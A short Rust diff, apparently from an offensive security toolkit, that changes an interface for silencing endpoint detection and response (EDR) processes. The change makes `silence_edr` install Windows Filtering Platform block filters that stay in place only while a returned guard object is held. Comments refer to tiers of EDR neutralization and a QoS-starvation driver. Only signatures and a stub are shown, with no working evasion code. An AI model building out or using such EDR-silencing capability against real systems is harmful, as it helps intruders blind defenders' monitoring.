@@ -232,7 +232,14 @@ pub trait MiniFilterKit {
 /// A third, lower-noise path — QoS starvation via `EDRChoker` (`pacer.sys`,
 /// below WFP) — lives in `EdrNeutralizeKit::Choke`.
 pub trait WfpKit {
-    fn silence_edr(&self, edr_pids: &[u32]) -> Result<(), KitError>;
+    /// Silence the given EDR PIDs by installing WFP block filters.
+    ///
+    /// Returns a [`netsec::WfpSilenceGuard`] whose Drop removes every filter
+    /// added by this call (closing the BFE session). The caller MUST hold the
+    /// guard for as long as the silence should remain in effect — dropping it
+    /// restores the EDR's network telemetry. This makes silence scoped and
+    /// residue-free: there's no separate "un-silence" call to forget.
+    fn silence_edr(&self, edr_pids: &[u32]) -> Result<netsec::WfpSilenceGuard, KitError>;
 }
 
 /// §2.5 — EDR process neutralization. Three noise tiers.
@@ -373,7 +380,7 @@ impl MiniFilterKit for NoKernel {
     }
 }
 impl WfpKit for NoKernel {
-    fn silence_edr(&self, _edr_pids: &[u32]) -> Result<(), KitError> {
+    fn silence_edr(&self, _edr_pids: &[u32]) -> Result<netsec::WfpSilenceGuard, KitError> {
         Err(KitError::UnsupportedPosture("NoKernel floor"))
     }
 }
